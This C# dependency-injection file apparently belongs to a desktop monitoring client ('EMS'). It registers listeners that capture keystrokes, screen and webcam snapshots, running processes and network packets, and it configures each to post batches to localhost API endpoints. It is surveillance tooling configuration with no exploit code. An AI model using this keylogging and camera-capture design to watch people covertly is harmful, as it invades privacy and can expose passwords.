using EMS.Core;
using EMS.Core.Interfaces;
using EMS.Core.Interfaces.Providers;
using EMS.Core.Providers;
using EMS.Infrastructure.Common.Configurations;
using EMS.Infrastructure.Common.Configurations.ListenersConfigs;
using EMS.Infrastructure.Common.Providers;
using EMS.Infrastructure.DependencyInjection;
using EMS.Infrastructure.DependencyInjection.Interfaces;
using Serilog;
using Serilog.Formatting.Json;
using System.Collections.Generic;

namespace EMS.Desktop.Client
{
    public class DependenciesRegister
    {
        public IInjector RegisterDependencies(string jsonConfig)
        {
            var injector = UnityInjector.Instance;

            this.RegisterLogger(injector);

            injector
                .Register<IHttpClient, DefaultHttpClient>()
                .Register<IWin32ApiProvider, Win32ApiProvider>()
                .RegisterInstance<KeyboardApiConfig>(
                    new KeyboardApiConfig { SleepIntervalInMilliseconds = 15 })
                .RegisterInstance<DisplayApiConfig>(
                    new DisplayApiConfig { DisplayWatcherSleepIntervalInMilliseconds = 1000 })
                .RegisterInstance<CameraApiConfig>(
                    new CameraApiConfig { SnapshotTimerConfig = new TimerConfig { DueTime = 2000, Period = 2000 } })
                .RegisterInstance<ProcessApiConfig>(
                    new ProcessApiConfig
                    {
                        ActiveProcessesChangedTimerConfig = new TimerConfig { DueTime = 2000, Period = 2000 },
                        ForegroundProcessChangedTimerConfig = new TimerConfig { DueTime = 2000, Period = 2000 }
                    }
                )
                .Register<IKeyboardApi, KeyboardApi>()
                .Register<IDisplayApi, DisplayApi>()
                .Register<ICameraApi, CameraApi>()
                .Register<IProcessApi, ProcessApi>()
                .Register<INetworkApi, NetworkApi>()
                .RegisterInstance<KeyboardListenerConfig>(
                    new KeyboardListenerConfig
                    {
                        SendCapturedItemsThreshold = 20,
                        SendCapturedItemsDestinationUri = "http://localhost:64435/api/CapturedKeys/PostCapturedKeys",
                        RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
                        SendCapturedItemsTimerConfig = new TimerConfig
                        {
                            DueTime = 5000,
                            Period = 2000
                        }
                    })
                .RegisterInstance<DisplayListenerConfig>(
                    new DisplayListenerConfig
                    {
                        SendCapturedItemsThreshold = 3,
                        SendCapturedItemsDestinationUri = "http://localhost:64435/api/DisplaySnapshots/PostCapturedDisplaySnapshots",
                        RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
                        SendCapturedItemsTimerConfig = new TimerConfig
                        {
                            DueTime = 5000,
                            Period = 2000
                        }
                    })
                .RegisterInstance<CameraListenerConfig>(
                    new CameraListenerConfig
                    {
                        SendCapturedItemsThreshold = 3,
                        SendCapturedItemsDestinationUri = "http://localhost:64435/api/CameraSnapshots/PostCameraSnapshots",
                        RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
                        SendCapturedItemsTimerConfig = new TimerConfig
                        {
                            DueTime = 5000,
                            Period = 2000
                        }
                    })
                .RegisterInstance<ActiveProcessesListenerConfig>(
                    new ActiveProcessesListenerConfig
                    {
                        SendCapturedItemsThreshold = 5,
                        SendCapturedItemsDestinationUri = "http://localhost:64435/api/ActiveProcesses/PostActiveProcesses",
                        RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
                        SendCapturedItemsTimerConfig = new TimerConfig
                        {
                            DueTime = 5000,
                            Period = 2000
                        }
                    })
                .RegisterInstance<ForegroundProcessListenerConfig>(
                    new ForegroundProcessListenerConfig
                    {
                        SendCapturedItemsThreshold = 5,
                        SendCapturedItemsDestinationUri = "http://localhost:64435/api/ForegroundProcess/PostForegroundProcess",
                        RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
                        SendCapturedItemsTimerConfig = new TimerConfig
                        {
                            DueTime = 5000,
                            Period = 2000
                        }
                    })
                .RegisterInstance<NetworkListenerConfig>(
                    new NetworkListenerConfig
                    {
                        SendCapturedItemsThreshold = 50,
                        SendCapturedItemsDestinationUri = "http://localhost:64435/api/NetworkPackets/PostNetworkPackets",
                        RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
                        SendCapturedItemsTimerConfig = new TimerConfig
                        {
                            DueTime = 5000,
                            Period = 2000
                        }
                    })
                .Register<IListener, KeyboardListener>(nameof(KeyboardListener))
                .Register<IListener, DisplayListener>(nameof(DisplayListener))
                .Register<IListener, CameraListener>(nameof(CameraListener))
                .Register<IListener, ActiveProcessesListener>(nameof(ActiveProcessesListener))
                .Register<IListener, ForegroundProcessListener>(nameof(ForegroundProcessListener))
                .Register<IListener, NetworkPacketListener>(nameof(NetworkPacketListener));

            var keyboardApi = injector.Resolve<IKeyboardApi>();

            return injector;
        }

        private void RegisterLogger(IInjector injector)
        {
            var delimiter = new string('*', 40);
            var formatter = new JsonFormatter(closingDelimiter: delimiter);
            var logsFilePath = @"..\..\Logs\Serilog.txt";

            var logger = new LoggerConfiguration()
                .MinimumLevel.Debug()
                .WriteTo.File(formatter, logsFilePath)
                .CreateLogger();

            injector.RegisterInstance<ILogger>(logger);
        }
    }
}
